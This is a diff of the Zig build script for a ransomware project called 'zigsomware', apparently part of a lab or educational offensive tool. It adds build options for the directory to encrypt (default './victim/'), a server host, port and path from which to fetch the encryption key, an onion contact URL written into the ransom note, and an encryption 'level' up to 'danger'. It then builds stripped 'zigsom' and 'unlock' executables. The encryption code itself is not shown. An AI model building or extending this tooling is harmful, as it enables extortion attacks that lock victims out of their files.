@@ -1,118 +1,82 @@
 const std = @import("std");
+const Build = std.Build;
 
-const APP_NAME: []const u8 = "zigsomware";
+pub fn build(b: *Build) !void {
+    const target = b.standardTargetOptions(.{});
+    const optimize = .ReleaseSmall;
 
-const targets: []const std.Target.Query = &.{
-    // .{ .cpu_arch = .aarch64, .os_tag = .macos },
-    .{ .cpu_arch = .x86_64, .os_tag = .macos },
-    .{ .cpu_arch = .x86_64, .os_tag = .linux },
-    .{ .cpu_arch = .x86_64, .os_tag = .windows },
-};
-
-// See Algorithm in './src/alg.zig'
-const supported_algorithms: []const []const u8 = &.{
-    "xchacha20-poly1305",
-};
-
-fn isSupportedAlgorithm(alg: []const u8) bool {
-    for (supported_algorithms) |supported_alg| {
-        if (std.mem.eql(u8, supported_alg, alg)) {
-            return true;
-        }
-    }
-    return false;
-}
-
-const supported_level: []const []const u8 = &.{
-    "safe",
-    "normal",
-    "danger",
-};
-
-pub fn build(b: *std.Build) !void {
-    // const optimize = b.standardOptimizeOption(.{});
-    const optimize = .ReleaseSafe;
-
-    // Build options (-Dlhost, -Dlport)
-    const opt_alg = b.option(
+    // Build options
+    const opt_dir = b.option(
         []const u8,
-        "ALG",
-        "Algorithm for encryption/decryption",
-    ) orelse "xchacha20-poly1305";
+        "dir",
+        "Path of the directory to start encryption. (default: './victim/')",
+    ) orelse "./victim/";
     const opt_server_host = b.option(
         []const u8,
-        "SERVER_HOST",
+        "server_host",
         "Server address",
     ) orelse "127.0.0.1";
     const opt_server_port = b.option(
         u16,
-        "SERVER_PORT",
+        "server_port",
         "Server port",
     ) orelse 4444;
     const opt_server_path = b.option(
         []const u8,
-        "SERVER_PATH",
+        "server_path",
         "The URL path of the server to download the encryption key",
     ) orelse "/";
     const opt_contact_url = b.option(
         []const u8,
-        "CONTACT_URL",
+        "contact_url",
         "Your website URL such as Onion URL, that will be written in the ransom note",
-    ) orelse "http://xxxxxxxxxxxxxxxxxxxxxxxxx.onion";
+    ) orelse "http://xxxxxxxxxxxxxxxxxxxxxxxxxxx.onion";
     const opt_level = b.option(
         usize,
-        "LEVEL",
+        "level",
         "The level at which Zigsomware encrypts files. The higher the level, the more files will be encrypted. [1: safe, 2: normal, 3: danger] (default: 1)",
     ) orelse 1;
 
     // Validate options
-    if (!isSupportedAlgorithm(opt_alg)) {
-        std.log.err("The ALG is invalid. Choose one of the following:\n", .{});
-        for (supported_algorithms) |supported_alg| {
-            std.debug.print("{s}, ", .{supported_alg});
-        }
-        std.debug.print("\n\n", .{});
-        return error.UnsupportedAlgorithm;
-    }
     if (!std.mem.startsWith(u8, opt_server_path, "/")) {
-        std.log.err("The SERVER_PATH must be started with '/'.\n", .{});
+        std.log.err("The '-Dserver_path' must be started with '/'.\n", .{});
         return error.InvalidServerPath;
     }
     if (opt_level < 1 or 3 < opt_level) {
-        std.log.err("The LEVEL must be between 1 and 3.\n", .{});
+        std.log.err("The '-Dlevel' must be between 1 and 3.\n", .{});
         return error.InvalidLevel;
     }
 
     const opts = b.addOptions();
-    opts.addOption([]const u8, "alg", opt_alg);
+    opts.addOption([]const u8, "dir", opt_dir);
     opts.addOption([]const u8, "server_host", opt_server_host);
     opts.addOption(u16, "server_port", opt_server_port);
     opts.addOption([]const u8, "server_path", opt_server_path);
     opts.addOption([]const u8, "contact_url", opt_contact_url);
     opts.addOption(usize, "level", opt_level);
 
-    for (targets) |t| {
-        const exe = b.addExecutable(.{
-            .name = APP_NAME,
-            .root_source_file = b.path("src/main.zig"),
-            .target = b.resolveTargetQuery(t),
-            .optimize = optimize,
-            .link_libc = true,
-        });
-        exe.root_module.addImport("clap", b.dependency("clap", .{}).module("clap"));
-        // Embed build options
-        exe.root_module.addOptions("build_options", opts);
+    // "zigsom"
+    const exe_zigsom = b.addExecutable(.{
+        .name = "zigsom",
+        .root_source_file = b.path("src/zigsom.zig"),
+        .target = target,
+        .optimize = optimize,
+        .link_libc = true,
+        .strip = true,
+    });
+    // Embed build options
+    exe_zigsom.root_module.addOptions("build_options", opts);
+    b.installArtifact(exe_zigsom);
 
-        const target_output_exe = b.addInstallArtifact(
-            exe,
-            .{
-                .dest_dir = .{
-                    .override = .{
-                        .custom = try t.zigTriple(b.allocator),
-                    },
-                },
-            },
-        );
-        b.getInstallStep().dependOn(&target_output_exe.step);
-    }
+    // "unlock"
+    const exe_unlock = b.addExecutable(.{
+        .name = "unlock",
+        .root_source_file = b.path("src/unlock.zig"),
+        .target = target,
+        .optimize = optimize,
+        .link_libc = true,
+        .strip = true,
+    });
+    exe_unlock.root_module.addImport("clap", b.dependency("clap", .{}).module("clap"));
+    b.installArtifact(exe_unlock);
 }
